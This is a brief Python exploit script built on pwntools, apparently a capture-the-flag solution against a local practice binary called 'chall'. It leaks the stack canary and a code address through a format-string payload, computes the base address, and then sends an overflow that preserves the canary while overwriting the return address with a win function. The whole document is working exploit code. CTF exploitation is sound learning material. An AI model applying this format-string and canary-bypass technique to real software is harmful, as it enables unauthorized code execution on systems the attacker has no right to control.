#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./chall")
p = process(elf.path)

# Format string to leak canary & a_main
payload = b"%13$p%17$p"
p.sendline(payload)

# Get canary
p.recvuntil(b"Hello, ")
canary = p64(int(p.recv(18).decode(), 16))

# Get a_win
a_main = int(p.recv(14).decode(), 16)
a_base = a_main - 0x1637
a_win = p64(a_base + 0x1619)

# Craft payload
payload = b"A" * (0x20 - 0x8) # Buffer
payload += canary # Canary
payload += b"B" * 0x8
payload += a_win # Ret addr

# Send payload
p.sendline(payload)
p.interactive()


